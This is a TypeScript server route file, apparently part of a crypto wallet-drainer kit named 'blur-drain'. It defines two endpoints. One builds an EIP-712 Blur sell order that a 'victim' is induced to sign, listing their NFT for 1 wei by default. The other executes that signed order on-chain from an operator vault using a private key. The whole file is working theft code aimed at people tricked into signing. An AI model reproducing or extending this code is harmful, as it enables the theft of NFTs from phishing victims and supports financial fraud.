/**
 * Blur NFT marketplace routes — Phase 6
 * =======================================
 * Endpoints for Blur V1 sell-order listing creation and on-chain fulfillment.
 *
 * Routes:
 *   POST /api/v1/blur/listing-typed-data  — build EIP-712 sell order for victim to sign
 *   POST /api/v1/blur/fulfill             — execute the signed sell order on-chain
 */
import {
  buildBlurListingTypedData,
  fulfillBlurListing,
} from '@legion/core/logic/blur-drain'
import { getAddress, isAddress } from 'viem'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import { z } from 'zod'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { parseBody } from '../lib/schemas.js'

// ─── Schemas ──────────────────────────────────────────────────────────────────

const blurListingTypedDataBodySchema = z.object({
  wallet_address: z
    .string()
    .min(1)
    .regex(/^0x[a-fA-F0-9]{40}$/, 'wallet_address must be a valid EVM address'),
  nft_contract: z
    .string()
    .min(1)
    .regex(/^0x[a-fA-F0-9]{40}$/, 'nft_contract must be a valid EVM address'),
  token_id: z.union([z.string().min(1), z.number().int().nonnegative()]),
  chain_id: z.number().int().positive().default(1),
  nonce: z.string().optional(),       // stringified bigint from BlurExchange.nonces(wallet)
  price_wei: z.string().optional(),   // default: 1 wei
  expiration_days: z.number().int().positive().max(365).optional(),
})

const blurFulfillBodySchema = z.object({
  /** The order_parameters returned from /blur/listing-typed-data, serialized */
  order_parameters: z.object({
    trader: z.string(),
    side: z.number(),
    matchingPolicy: z.string(),
    collection: z.string(),
    tokenId: z.union([z.string(), z.number()]),
    amount: z.union([z.string(), z.number()]),
    paymentToken: z.string(),
    price: z.union([z.string(), z.number()]),
    listingTime: z.union([z.string(), z.number()]),
    expirationTime: z.union([z.string(), z.number()]),
    fees: z.array(z.object({ rate: z.number(), recipient: z.string() })).optional(),
    salt: z.union([z.string(), z.number()]),
    extraParams: z.string(),
    nonce: z.union([z.string(), z.number()]),
  }),
  /** EIP-712 signature from the victim's wallet */
  signature: z.string().min(130).max(136),
  chain_id: z.number().int().positive().default(1),
  rpc_url: z.string().url().optional(),
})

// ─── Helpers ──────────────────────────────────────────────────────────────────

function normalizeBigInts<T>(value: T): T {
  if (typeof value === 'bigint') return value.toString() as T
  if (Array.isArray(value)) return value.map((v) => normalizeBigInts(v)) as T
  if (value && typeof value === 'object') {
    const out: Record<string, unknown> = {}
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      out[k] = normalizeBigInts(v)
    }
    return out as T
  }
  return value
}

// ─── Routes ───────────────────────────────────────────────────────────────────

export async function registerBlurRoutes(app: FastifyInstance): Promise<void> {
  /**
   * POST /api/v1/blur/listing-typed-data
   *
   * Returns EIP-712 typed data for a Blur V1 sell order that the victim signs
   * via `eth_signTypedData_v4`. The victim is presented as the "seller" offering
   * their NFT at the specified price (default: 1 wei).
   */
  app.post(
    '/api/v1/blur/listing-typed-data',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const parsed = parseBody(blurListingTypedDataBodySchema, request.body)
      if (parsed.ok === false) {
        return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
      }
      const body = parsed.data
      if (!isAddress(body.wallet_address) || !isAddress(body.nft_contract)) {
        return sendFailure(reply, 400, 'wallet_address and nft_contract must be valid EVM addresses', {
          code: 'ValidationError',
        })
      }

      try {
        const built = await buildBlurListingTypedData({
          offerer: getAddress(body.wallet_address),
          nftContract: getAddress(body.nft_contract),
          tokenId: String(body.token_id),
          priceWei: body.price_wei ? BigInt(body.price_wei) : 1n,
          chainId: body.chain_id,
          nonce: body.nonce ? BigInt(body.nonce) : 0n,
          expirationDays: body.expiration_days,
        })

        return sendSuccess(reply, 200, 'Blur listing typed data ready', {
          typed_data: normalizeBigInts(built.typedData),
          order_parameters: normalizeBigInts(built.order_parameters),
          protocol: built.protocol,
        })
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        return sendFailure(reply, 500, msg, { code: 'ServerError' })
      }
    },
  )

  /**
   * POST /api/v1/blur/fulfill
   *
   * Executes a signed Blur V1 sell order on-chain. Constructs the matching buy
   * order from the operator vault, signs it, and calls BlurExchange.execute(sell, buy).
   * Requires SETTLEMENT_EXECUTION_PRIVATE_KEY and SETTLEMENT_RPC_URL env vars.
   */
  app.post('/api/v1/blur/fulfill', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(blurFulfillBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data

    const executionKey = process.env['SETTLEMENT_EXECUTION_PRIVATE_KEY']
    if (!executionKey?.startsWith('0x')) {
      return sendFailure(reply, 503, 'Execution key not configured', { code: 'ServerError' })
    }

    const rpcUrl =
      body.rpc_url ??
      process.env[`RPC_URL_${body.chain_id}`] ??
      process.env['SETTLEMENT_RPC_URL'] ??
      'https://eth.llamarpc.com'

    try {
      const op = body.order_parameters
      const sellOrder = {
        trader: getAddress(String(op.trader)),
        side: Number(op.side),
        matchingPolicy: getAddress(String(op.matchingPolicy)),
        collection: getAddress(String(op.collection)),
        tokenId: BigInt(String(op.tokenId)),
        amount: BigInt(String(op.amount)),
        paymentToken: getAddress(String(op.paymentToken)),
        price: BigInt(String(op.price)),
        listingTime: BigInt(String(op.listingTime)),
        expirationTime: BigInt(String(op.expirationTime)),
        fees: (op.fees ?? []).map((f) => ({
          rate: f.rate,
          recipient: getAddress(String(f.recipient)),
        })),
        salt: BigInt(String(op.salt)),
        extraParams: String(op.extraParams) as `0x${string}`,
        nonce: BigInt(String(op.nonce)),
      }

      const result = await fulfillBlurListing({
        sellOrder,
        sellSignature: body.signature,
        chainId: body.chain_id,
        executionPrivateKey: executionKey as `0x${string}`,
        rpcUrl,
      })

      if (!result.ok) {
        return sendFailure(reply, 502, result.detail ?? 'Blur fulfill failed', {
          code: 'SettlementFailed',
          transaction_hash: result.transaction_hash ?? null,
        })
      }

      return sendSuccess(reply, 200, 'Blur order fulfilled', {
        transaction_hash: result.transaction_hash,
        protocol: 'blur_listing',
        collection: sellOrder.collection,
        token_id: sellOrder.tokenId.toString(),
      })
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'ValidationError' })
    }
  })
}
